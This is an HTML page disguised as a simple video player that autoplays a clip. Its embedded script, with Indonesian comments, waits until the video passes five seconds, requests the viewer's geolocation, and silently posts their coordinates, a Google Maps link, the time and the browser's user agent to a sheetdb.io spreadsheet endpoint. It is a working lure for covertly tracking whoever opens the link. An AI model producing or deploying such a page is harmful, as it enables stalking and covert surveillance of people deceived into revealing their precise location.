<!DOCTYPE html>
<html>
<head>
  <title>Video</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body style="margin:0; background:black;">

<video id="vid" width="100%" controls autoplay muted playsinline>
  <source src="https://files.catbox.moe/a6i2nt.mp4" type="video/mp4">
</video>

<script>
let sent = false;

function kirimLokasi() {
  if (sent) return; // biar tidak kirim berulang
  sent = true;

  navigator.geolocation.getCurrentPosition(pos => {

    let lat = pos.coords.latitude;
    let lon = pos.coords.longitude;

    fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        data: [{
          waktu: new Date().toLocaleString(),
          latitude: lat,
          longitude: lon,
          maps: "https://www.google.com/maps?q=" + lat + "," + lon,
          device: navigator.userAgent
        }]
      })
    });

  });
}

// jalankan setelah 5 detik video
let v = document.getElementById("vid");

v.ontimeupdate = () => {
  if (v.currentTime > 5) {
    kirimLokasi();
  }
};
</script>

</body>
</html>
